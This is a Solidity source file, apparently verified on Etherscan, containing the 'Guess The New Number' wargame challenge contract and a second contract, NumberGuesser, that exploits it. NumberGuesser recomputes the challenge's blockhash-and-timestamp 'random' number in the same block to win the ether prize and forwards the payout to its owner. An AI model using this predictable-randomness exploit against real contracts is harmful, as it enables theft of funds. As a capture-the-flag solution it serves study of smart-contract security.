/**
 *Submitted for verification at Etherscan.io on 2021-10-17
*/

pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract NumberGuesser {
    address contractAddress = 0xE7C9d95d31CF64979A96848eA1D172B5412176eD;
    address owner;

    function NumberGuesser() public {
        owner = msg.sender;
    }

    function guess() public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number-1), now));
        GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(contractAddress);
        challenge.guess.value(msg.value)(answer);
    }

    function() public payable {
        owner.transfer(msg.value);
    }
}